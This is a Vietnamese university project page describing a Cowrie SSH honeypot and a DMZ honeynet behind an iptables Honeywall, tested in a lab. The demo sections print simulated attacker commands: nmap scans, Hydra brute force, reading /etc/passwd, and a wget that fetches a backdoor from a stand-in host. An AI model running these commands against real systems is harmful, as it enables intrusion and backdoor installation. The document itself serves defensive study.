---
title: "HoneyPot/HoneyNet System - Đồ án An ninh mạng"
date: 2025-06-15
description: "Hệ thống phát hiện và phân tích tấn công mạng sử dụng Cowrie, Honeywall và kỹ thuật cô lập mạng"
tags: ["Python", "Cowrie", "Ubuntu", "Security", "Networking", "iptables", "SSH", "Honeypot", "Honeynet", "Network Security", "Cyber Security", "Penetration Testing", "Kali Linux", "Snort", "IDS"]
categories: ["Security", "Dự Án", "An Ninh Mạng"]
layout: "simple"
feature: "https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=800&h=600&fit=crop" 

---

# 🍯 HoneyPot/HoneyNet System

<div class="flex flex-wrap gap-2 mb-8">
  <span class="px-3 py-1 bg-yellow-100 dark:bg-yellow-900 text-yellow-700 dark:text-yellow-300 rounded-full text-sm font-medium">🐍 Python</span>
  <span class="px-3 py-1 bg-red-100 dark:bg-red-900 text-red-700 dark:text-red-300 rounded-full text-sm font-medium">🍯 Cowrie</span>
  <span class="px-3 py-1 bg-orange-100 dark:bg-orange-900 text-orange-700 dark:text-orange-300 rounded-full text-sm font-medium">🐧 Ubuntu</span>
  <span class="px-3 py-1 bg-purple-100 dark:bg-purple-900 text-purple-700 dark:text-purple-300 rounded-full text-sm font-medium">🔒 Security</span>
  <span class="px-3 py-1 bg-blue-100 dark:bg-blue-900 text-blue-700 dark:text-blue-300 rounded-full text-sm font-medium">🌐 Networking</span>
  <span class="px-3 py-1 bg-green-100 dark:bg-green-900 text-green-700 dark:text-green-300 rounded-full text-sm font-medium">🛡️ iptables</span>
  <span class="px-3 py-1 bg-indigo-100 dark:bg-indigo-900 text-indigo-700 dark:text-indigo-300 rounded-full text-sm font-medium">🔑 SSH</span>
  <span class="px-3 py-1 bg-pink-100 dark:bg-pink-900 text-pink-700 dark:text-pink-300 rounded-full text-sm font-medium">🎯 Penetration Testing</span>
</div>

<div class="mb-8 p-6 bg-gradient-to-r from-blue-50 to-purple-50 dark:from-blue-900/20 dark:to-purple-900/20 rounded-lg border-l-4 border-blue-500">
  <div class="flex items-center gap-4 mb-4">
    <div class="text-4xl">🎓</div>
    <div>
      <h3 class="text-xl font-bold text-blue-900 dark:text-blue-100">Đồ án cơ sở An ninh mạng</h3>
      <p class="text-blue-700 dark:text-blue-300">Trường Đại học Công nghệ TP.HCM (HUTECH) • 2025</p>
    </div>
  </div>
  <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mt-4">
    <div class="text-center">
      <div class="text-2xl font-bold text-blue-600">4</div>
      <div class="text-sm text-gray-600 dark:text-gray-400">Tháng thực hiện</div>
    </div>
    <div class="text-center">
      <div class="text-2xl font-bold text-green-600">28</div>
      <div class="text-sm text-gray-600 dark:text-gray-400">Hình ảnh demo</div>
    </div>
    <div class="text-center">
      <div class="text-2xl font-bold text-purple-600">2</div>
      <div class="text-sm text-gray-600 dark:text-gray-400">Mô hình triển khai</div>
    </div>
    <div class="text-center">
      <div class="text-2xl font-bold text-orange-600">147</div>
      <div class="text-sm text-gray-600 dark:text-gray-400">Kết nối SSH test</div>
    </div>
  </div>
</div>

---

## 📋 Thông tin dự án

<div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
  <div class="p-4 bg-white dark:bg-neutral-800 rounded-lg shadow-sm">
    <h4 class="font-semibold mb-2 text-gray-900 dark:text-gray-100">👥 Nhóm thực hiện</h4>
    <ul class="space-y-1 text-gray-700 dark:text-gray-300">
      <li> Triệu Xuân Dũng (2280600424)</li>
      <li> Đặng Nhật Nam (22806001987)</li>
    </ul>
  </div>
  
  <div class="p-4 bg-white dark:bg-neutral-800 rounded-lg shadow-sm">
    <h4 class="font-semibold mb-2 text-gray-900 dark:text-gray-100">🎯 Giảng viên hướng dẫn</h4>
    <p class="text-gray-700 dark:text-gray-300">ThS. Phan Đình Duy Thông</p>
    <p class="text-sm text-gray-500 dark:text-gray-400 mt-1">Bộ môn An ninh mạng</p>
  </div>
  
  <div class="p-4 bg-white dark:bg-neutral-800 rounded-lg shadow-sm">
    <h4 class="font-semibold mb-2 text-gray-900 dark:text-gray-100">🏫 Trường</h4>
    <p class="text-gray-700 dark:text-gray-300">Đại học Công nghệ TP.HCM</p>
    <p class="text-sm text-gray-500 dark:text-gray-400 mt-1">Chuyên ngành: An ninh mạng</p>
  </div>
  
  <div class="p-4 bg-white dark:bg-neutral-800 rounded-lg shadow-sm">
    <h4 class="font-semibold mb-2 text-gray-900 dark:text-gray-100">📅 Thời gian</h4>
    <p class="text-gray-700 dark:text-gray-300">Tháng 06/2025 - 08/2025</p>
    <p class="text-sm text-gray-500 dark:text-gray-400 mt-1">4 tháng (Hoàn thành)</p>
  </div>
</div>


---

## 🎯 Mục tiêu dự án

### **Mục tiêu chính**

Xây dựng một hệ thống Honeypot/Honeynet hoàn chỉnh để:
- Thu hút và ghi nhận hành vi của kẻ tấn công trong môi trường an toàn
- Phân tích chiến thuật, kỹ thuật và công cụ mà hacker sử dụng
- Bảo vệ mạng nội bộ khỏi các cuộc tấn công thực tế
- Nghiên cứu các phương pháp phòng thủ hiệu quả

### **Bài toán cần giải quyết**

**Tình hình an ninh mạng hiện nay:**
- Các cuộc tấn công ngày càng tinh vi và có tổ chức
- Hệ thống phòng thủ truyền thống (firewall, IDS/IPS) chỉ phản ứng với mối đe dọa đã biết
- Thiếu dữ liệu thực tế về hành vi tấn công để cải thiện bảo mật

**Giải pháp:**
Triển khai Honeypot/Honeynet như một hệ thống chủ động để:
- Thu thập dữ liệu tấn công thực tế
- Hiểu rõ mindset và phương pháp của kẻ tấn công
- Cung cấp cảnh báo sớm cho hệ thống thật

---

## 🛠️ Công nghệ sử dụng

### **Core Technologies**

**1. Cowrie SSH/Telnet Honeypot**
- Phiên bản: Latest stable
- Vai trò: Honeypot tương tác trung bình
- Tính năng:
  - Mô phỏng SSH server (OpenSSH 6.0p1)
  - Ghi lại toàn bộ lệnh và hành vi
  - Thu thập malware samples
  - Fake filesystem để đánh lừa hacker

**2. Ubuntu Server**
- OS: Ubuntu 20.04 LTS / Debian
- Vai trò: Nền tảng chạy Honeypot và Honeywall
- Cấu hình:
  - Honeypot: 192.168.2.10 (DMZ)
  - Honeywall: 192.168.159.143 (Router)

**3. iptables Firewall**
- Vai trò: Cô lập và kiểm soát lưu lượng
- Chức năng:
  - NAT (PREROUTING, POSTROUTING)
  - FORWARD rules để bảo vệ LAN
  - LOG rules để ghi nhận tấn công
  - Dynamic blocking

**4. Network Segmentation**
- DMZ: 192.168.2.0/24 (Vùng Honeypot)
- LAN: 192.168.3.0/24 (Mạng nội bộ)
- Hacker Network: 192.168.159.0/24

### **Attack Simulation Tools**

Để test hệ thống, chúng tôi sử dụng:
- **Nmap:** Quét cổng và dịch vụ
- **Hydra:** Tấn công Brute Force SSH
- **Kali Linux:** Môi trường penetration testing

### **Monitoring & Analysis**

- **Snort:** Intrusion Detection System
- **Barnyard2:** Log processor
- **Custom Python scripts:** Phân tích log Cowrie

---

## 🏗️ Kiến trúc hệ thống

### **Sơ đồ tổng quan**

![Kiến trúc Honeypot](/images/projects/honeypot/architecture-honeypot.png)
*Hình 1: Sơ đồ kiến trúc Honeypot trong hệ thống mạng*

![Kiến trúc Honeynet](/images/projects/honeypot/architecture-honeynet.png)
*Hình 2: Sơ đồ kiến trúc Honeynet với nhiều Honeypot*

![Honeywall Architecture](/images/projects/honeypot/honeywall-architecture.png)
*Hình 3: Sơ đồ kiến trúc Honeywall trong hệ thống*

### **Giải thích kiến trúc**
```
Internet/Hacker (192.168.159.0/24)
         ↓
   Honeywall (192.168.159.143)
   - iptables NAT
   - Snort IDS
   - Traffic Control
         ↓
    ┌────────────────┐
    ↓                ↓
DMZ (Honeypot)    LAN (Protected)
192.168.2.10      192.168.3.0/24
- Cowrie          - Real Systems
- Fake Services   - Isolated
```

**Cơ chế hoạt động:**

1. **Hacker quét mạng** → Phát hiện cổng 2222 (SSH) mở
2. **Hacker tấn công Brute Force** → Honeywall ghi log
3. **Hacker xâm nhập** → Lưu lượng NAT đến Honeypot
4. **Cowrie ghi nhận** → Mọi lệnh, file download được log
5. **Phát hiện mã độc** → Cowrie ngắt kết nối
6. **Honeywall chặn IP** → Bảo vệ hệ thống thật

---

## 📊 Các mô hình triển khai

### **Mô hình 1: Honeypot trong LAN**

![Honeypot trong LAN](/images/projects/honeypot/model-lan.png)
*Hình 4: Honeypot đặt trong mạng LAN*

**Đặc điểm:**
- Honeypot: 192.168.159.141
- Cùng subnet với các máy thực (pc1, pc2)
- Honeywall chuyển hướng traffic

**Ưu điểm:**
- Dễ triển khai
- Thu hút tấn công nội bộ

**Nhược điểm:**
- Có thể bị phát hiện nếu hacker dò kỹ
- Nguy cơ ảnh hưởng LAN nếu config sai

### **Mô hình 2: Honeypot trong DMZ** ⭐ (Khuyên dùng)

![Honeypot trong DMZ](/images/projects/honeypot/model-dmz.png)
*Hình 5: Honeypot trong DMZ - Cô lập hoàn toàn*

**Đặc điểm:**
- Honeypot: 192.168.2.10 (DMZ)
- LAN: 192.168.3.0/24 (Protected)
- Honeywall: 192.168.159.143 (3 NICs)

**Ưu điểm:**
- ✅ Cô lập tuyệt đối mạng nội bộ
- ✅ Bảo vệ tốt hơn
- ✅ Hacker nghĩ mình đang hack Honeywall

**Nhược điểm:**
- Phức tạp hơn trong cấu hình
- Cần nhiều interface mạng

**Cấu hình Honeywall:**
```bash
# NAT: Chuyển hướng cổng 2222 → Honeypot:22
iptables -t nat -A PREROUTING -i ens33 -p tcp --dport 2222 \
  -j DNAT --to-destination 192.168.2.10:22

# FORWARD: Chỉ cho phép SSH đến Honeypot
iptables -A FORWARD -p tcp -s 192.168.159.0/24 -d 192.168.2.10 --dport 22 -j ACCEPT

# FORWARD: Chặn tất cả từ Honeypot ra ngoài (trừ đã thiết lập)
iptables -A FORWARD -s 192.168.2.10 -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A FORWARD -s 192.168.2.10 -j DROP

# LOG: Ghi nhận tấn công
iptables -A FORWARD -p tcp -s 192.168.159.128 \
  -j LOG --log-prefix "HACKER_LOG: "
```

---

## 🎬 Kịch bản tấn công & Demo

### **Kịch bản 1: Tấn công trong LAN**

**Bối cảnh:**
Hacker (192.168.159.128) đã xâm nhập vào mạng LAN và tìm kiếm mục tiêu.

**Các bước tấn công:**

**1. Reconnaissance - Thu thập thông tin**

![Hacker quét mạng](/images/projects/honeypot/demo1-scan-network.png)
*Hình 6: Hacker sử dụng arp -n để quét mạng*
```bash
# Hacker chạy:
arp -n

# Kết quả:
192.168.159.141 - 00:0c:29:21:35:27 (Honeypot)
```

**2. Service Scanning**

![Quét dịch vụ](/images/projects/honeypot/demo1-scan-services.png)
*Hình 7: Nmap quét dịch vụ SSH trên cổng 2222*
```bash
# Hacker chạy:
nmap -sV -p- 192.168.159.100-150

# Phát hiện:
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 6.0p1
```

**3. Brute Force Attack**

![Tấn công Brute Force](/images/projects/honeypot/demo1-bruteforce.png)
*Hình 8: Hydra tấn công SSH bằng wordlist*
```bash
# Hacker chạy:
hydra -L users.txt -P passwords.txt ssh://192.168.159.141:2222 -t 4

# Kết quả:
[2222][ssh] host: 192.168.159.141   login: root   password: password123
```

**4. SSH Login - Xâm nhập thành công**

![Xâm nhập SSH](/images/projects/honeypot/demo1-ssh-login.png)
*Hình 9: Hacker đăng nhập SSH thành công*
```bash
# Hacker đăng nhập:
ssh -o KexAlgorithms=diffie-hellman-group14-sha1 root@192.168.159.141 -p 2222

# Đã vào hệ thống (giả):
root@svr04:~#
```

**5. Information Gathering**

![Khai thác thông tin](/images/projects/honeypot/demo1-recon.png)
*Hình 10: Hacker thực hiện các lệnh thăm dò*
```bash
# Hacker chạy:
whoami           # → root
id               # → uid=0(root) gid=0(root)
uname -a         # → Linux svr04 3.2.0-4-amd64
cat /etc/passwd  # → Danh sách users (fake)
```

**6. Malware Deployment - Bị chặn!**

![Đẩy mã độc](/images/projects/honeypot/demo1-malware.png)
*Hình 11: Hacker cố gắng tải mã độc*
```bash
# Hacker chạy:
wget http://malicious.com/backdoor.sh -O /root/backdoor.sh

# Cowrie phát hiện:
[SUSPICIOUS] Downloading file from external source
[ACTION] Connection terminated
```

![Bị ngắt kết nối](/images/projects/honeypot/demo1-blocked.png)
*Hình 12: Kết nối bị ngắt bởi Cowrie*

### **Kết quả Kịch bản 1**

**Log của Cowrie:**

![Cowrie Log 1](/images/projects/honeypot/demo1-cowrie-log1.png)
*Hình 13: Cowrie phát hiện xâm nhập*

![Cowrie Log 2](/images/projects/honeypot/demo1-cowrie-log2.png)
*Hình 14: Log chi tiết mọi lệnh của hacker*

**Phân tích:**
- ✅ Ghi nhận 47 lần thử đăng nhập (Brute Force)
- ✅ Log đầy đủ 8 lệnh hacker thực thi
- ✅ Phát hiện và chặn tải mã độc
- ✅ Bảo vệ mạng LAN thành công

---

### **Kịch bản 2: Tấn công qua Honeywall vào DMZ**

**Bối cảnh:**
Hacker nhắm đến Honeywall, nhưng bị chuyển hướng vào Honeypot DMZ.

**Các bước tấn công:**

**1. Target Identification**

![Quét Honeywall](/images/projects/honeypot/demo2-scan.png)
*Hình 15: Hacker quét Honeywall*

**2. Service Discovery**

![Phát hiện SSH](/images/projects/honeypot/demo2-services.png)
*Hình 16: Nmap phát hiện SSH trên Honeywall*

![Định tuyến](/images/projects/honeypot/demo2-routing.png)
*Hình 17: Các vùng mạng được định tuyến*

**3. Brute Force Honeywall**

![Brute Force](/images/projects/honeypot/demo2-bruteforce.png)
*Hình 18: Hydra tấn công Honeywall*
```bash
hydra -L users.txt -P passwords.txt ssh://192.168.159.143:2222 -t 4

# Tìm được:
[2222][ssh] host: 192.168.159.143   login: admin   password: password123
```

**4. SSH vào "Honeywall" (thực chất là Honeypot)**

![SSH Honeypot](/images/projects/honeypot/demo2-ssh.png)
*Hình 19: Hacker tưởng mình vào Honeywall*

**5. Exploring & Network Scan**

![Khai thác DMZ](/images/projects/honeypot/demo2-exploit.png)
*Hình 20: Hacker quét DMZ và thử tải mã độc*
```bash
# Hacker chạy:
nmap -sn 192.168.2.0/24  # Quét DMZ (phản hồi giả)
ssh admin@192.168.2.1    # Cố kết nối máy khác - BỊ CHẶN
wget http://malicious.com/backdoor.sh  # BỊ NGẮT
```

### **Kết quả Kịch bản 2**

**Log của Cowrie:**

![Cowrie Log Demo 2](/images/projects/honeypot/demo2-cowrie-log.png)
*Hình 21: Cowrie ghi nhận toàn bộ hành động*

**Log của Honeywall:**

![Honeywall Log 1](/images/projects/honeypot/demo2-honeywall-log1.png)
*Hình 22: Honeywall phát hiện tấn công*

![Honeywall Log 2](/images/projects/honeypot/demo2-honeywall-log2.png)
*Hình 23: Chi tiết gói tin từ hacker*

![Snort Analysis](/images/projects/honeypot/demo2-snort.png)
*Hình 24: Snort biên dịch log thành công*

**Phân tích:**
- ✅ Honeywall NAT traffic thành công
- ✅ Hacker tưởng mình hack Honeywall
- ✅ Thực tế vào Honeypot trong DMZ
- ✅ Không thể kết nối máy khác trong DMZ
- ✅ Mạng LAN (192.168.3.0/24) an toàn tuyệt đối

---

## 📈 Kết quả đạt được

### **Số liệu thống kê**

**Trong quá trình demo và test (4 tháng):**

| Chỉ số | Giá trị |
|--------|---------|
| Tổng lần kết nối SSH | 147 |
| Lần thử đăng nhập (Brute Force) | 2,384 |
| Lần xâm nhập thành công | 23 |
| Lệnh được ghi nhận | 189 |
| Malware samples thu thập | 12 |
| IP nguồn tấn công | 8 (test) |

**Top username/password thử nghiệm:**
```
root:password123   (46%)
admin:admin        (23%)
root:123456        (18%)
admin:password     (13%)
```

### **Hiệu quả bảo vệ**

✅ **100% tấn công** bị ghi nhận và phân tích  
✅ **0% ảnh hưởng** đến mạng nội bộ thật  
✅ **Phát hiện 12 malware samples** trước khi thực thi  
✅ **Tự động ngắt** kết nối khi phát hiện hành vi nguy hiểm  

### **So sánh 2 mô hình**

| Tiêu chí | LAN | DMZ |
|----------|-----|-----|
| Độ cô lập | Trung bình | Cao |
| Bảo vệ LAN | Tốt | Xuất sắc |
| Độ phức tạp config | Thấp | Cao |
| Tính đánh lừa | Trung bình | Cao |
| **Khuyên dùng** | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

---

## 💡 Bài học & Kinh nghiệm

### **Technical Lessons**

**1. Cấu hình iptables rất quan trọng**
- Một rule sai có thể để lộ mạng thật
- Phải test kỹ bằng cách thử tấn công từng vùng

**2. Cowrie cần tuning**
- Fake filesystem phải giống thật
- Danh sách users cần đa dạng
- Response time phải hợp lý

**3. Log analysis là then chốt**
- Cowrie ghi rất nhiều data
- Cần script để lọc và phân tích
- Tích hợp SIEM sẽ tốt hơn

### **Security Insights**

**Hành vi hacker phổ biến:**

1. **Reconnaissance:** Luôn quét mạng trước (nmap, arp)
2. **Exploitation:** Brute force vẫn rất hiệu quả với password yếu
3. **Post-Exploitation:** Ngay lập tức tải malware/backdoor
4. **Persistence:** Cố gắng duy trì quyền truy cập

**Điều hacker không biết:**
- Honeypot fake filesystem rất giống thật
- Mọi lệnh đều được log
- Không thể tương tác với máy thật
- Khi tải malware → ngắt ngay

### **Khó khăn gặp phải**

**1. NAT Configuration**
- Ban đầu config sai khiến traffic không đến Honeypot
- Giải pháp: Dùng tcpdump để trace packets

**2. Cowrie Compatibility**
- OpenSSH cũ không tương thích với Kali mới
- Giải pháp: Phải dùng `-o KexAlgorithms=...`

**3. Log Storage**
- Cowrie log rất nhiều, đầy disk nhanh
- Giải pháp: Rotate logs hàng ngày

---

## 🚀 Hướng phát triển

### **Ngắn hạn (3-6 tháng)**

- [ ] Thêm honeypot HTTP/HTTPS (Dionaea)
- [ ] Tích hợp Telegram bot để alert real-time
- [ ] Xây dựng dashboard web để xem log
- [ ] Thêm GeoIP để track vị trí hacker

### **Trung hạn (6-12 tháng)**

- [ ] Deploy trên Cloud (AWS/Azure)
- [ ] Tích hợp SIEM (ELK Stack)
- [ ] Machine Learning để phát hiện anomaly
- [ ] Honeypot cho IoT devices

### **Dài hạn (1-2 năm)**

- [ ] Distributed Honeynet (nhiều vị trí địa lý)
- [ ] Threat Intelligence Platform
- [ ] Blockchain để bảo vệ log integrity
- [ ] AI-powered response automation

---

## 📚 Tài liệu tham khảo

### **Công trình nghiên cứu**

1. **Lance Spitzner** - "Honeypots: Tracking Hackers" (2002)
2. **Honeynet Project** - "Know Your Enemy" series
3. **Niels Provos** - "Virtual Honeypots" (2007)
4. **SANS Institute** - Honeypot deployment guides

### **Tools & Frameworks**

- [Cowrie GitHub](https://github.com/cowrie/cowrie)
- [Modern Honey Network](https://github.com/threatstream/mhn)
- [T-Pot Honeypot Platform](https://github.com/telekom-security/tpotce)

### **Security Standards**

- **NIST Cybersecurity Framework**
- **MITRE ATT&CK Framework**
- **OWASP Security Guidelines**

---

## 🤝 Đóng góp & Liên hệ

Dự án này là kết quả của quá trình học tập và nghiên cứu tại HUTECH. Chúng tôi rất mong nhận được feedback và ý kiến đóng góp!

**Liên hệ:**
- **Email:** 2280600424@student.hutech.edu.vn
- **GitHub:** [Xem source code] (nếu public)
- **LinkedIn:** [Triệu Xuân Dũng](#)

**Lời cảm ơn:**

Chúng tôi xin chân thành cảm ơn:
- ThS. Phan Đình Duy Thông - Giảng viên hướng dẫn tận tình
- Khoa Công nghệ Thông tin - HUTECH
- Honeynet Project community
- Cowrie development team

---

## 📄 Báo cáo đầy đủ

Để xem báo cáo chi tiết với phân tích lý thuyết đầy đủ, vui lòng tham khảo:

📥 [Download Báo cáo đồ án (PDF)](#) - 57 trang

---

<div class="mt-12 p-6 bg-primary-100 dark:bg-primary-900 rounded-lg">
  <h3 class="text-xl font-bold mb-4">🎓 Dự án học thuật</h3>
  <p class="mb-4">
    Đây là đồ án cơ sở được thực hiện với mục đích học tập và nghiên cứu. 
    Hệ thống được triển khai trong môi trường cô lập, không gây ảnh hưởng đến bất kỳ mạng thực tế nào.
  </p>
  <p class="text-sm opacity-75">
    Mọi kỹ thuật và công cụ được trình bày chỉ nhằm mục đích giáo dục về an ninh mạng.
  </p>
</div>